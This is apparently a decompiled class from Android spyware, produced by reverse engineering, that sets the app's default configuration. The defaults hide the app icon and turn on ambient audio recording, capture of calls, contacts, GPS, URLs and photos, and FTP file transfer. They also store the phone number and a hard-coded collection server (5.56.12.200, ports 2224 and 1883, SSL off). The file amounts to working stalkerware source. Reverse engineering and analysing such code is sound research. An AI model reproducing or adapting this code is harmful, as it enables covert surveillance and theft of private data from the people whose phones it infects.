package com.app.system.common;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.security.d.a;

public class e
{
  public static void a(Context paramContext)
  {
    a.d("Global", "initGobal", new Object[0]);
    SharedPreferences.Editor localEditor = paramContext.getSharedPreferences("pref", 0).edit();
    localEditor.putBoolean("init-msg-shown", false);
    localEditor.putBoolean("installation-completed", false);
    localEditor.putBoolean("activation-sms-received", false);
    localEditor.putBoolean("agent-active", false);
    localEditor.putBoolean("is_device_rooted", false);
    localEditor.putBoolean("client-update-setting", false);
    localEditor.putBoolean("hide-icon", true);
    localEditor.putInt("is_first_get_setting", 0);
    localEditor.putLong("send-to-server-interval", 60L);
    localEditor.putLong("last_sync_time", 0L);
    localEditor.putBoolean("media-data-transfered-by-wifi-only", true);
    localEditor.putBoolean("send-operation-output", false);
    localEditor.putString("device-telephone-number", h.d(paramContext));
    localEditor.putBoolean("call-active", true);
    localEditor.putBoolean("list-calls-active", true);
    localEditor.putBoolean("contact-active", true);
    localEditor.putLong("last-call-date", 0L);
    localEditor.putLong("last-contact-date", 0L);
    localEditor.putBoolean("sms-active", false);
    localEditor.putLong("last-sms-date", 0L);
    localEditor.putBoolean("whatsapp-key-sent", false);
    localEditor.putBoolean("whatsapp-im-active", false);
    localEditor.putBoolean("whatsapp-active", false);
    localEditor.putBoolean("ambient-record-active", true);
    localEditor.putLong("amb-rec-stop", 0L);
    localEditor.putBoolean("media-data-transfered-by-wifi-only", true);
    localEditor.putBoolean("files-active", true);
    localEditor.putLong("last-photo-date", 0L);
    localEditor.putBoolean("use-ftp-for-files-transfer", true);
    localEditor.putBoolean("gps-active", true);
    localEditor.putLong("gps-interval", 20L);
    localEditor.putBoolean("url-active", true);
    localEditor.putLong("last-url-date", 0L);
    localEditor.putBoolean("app-log-active", true);
    localEditor.putBoolean("shoot-photo-active", true);
    localEditor.putString("DEST_SERVER_IP", "5.56.12.200");
    localEditor.putInt("DEST_SERVER_PORT", 2224);
    localEditor.putInt("DEST_SERVER_MQTT_PORT", 1883);
    localEditor.putBoolean("DEST_SERVER_SSL_ACTIVE", false);
    localEditor.commit();
  }
}


/* Location:              ~/com/app/system/common/e.class
 *
 * Reversed by:           J
 */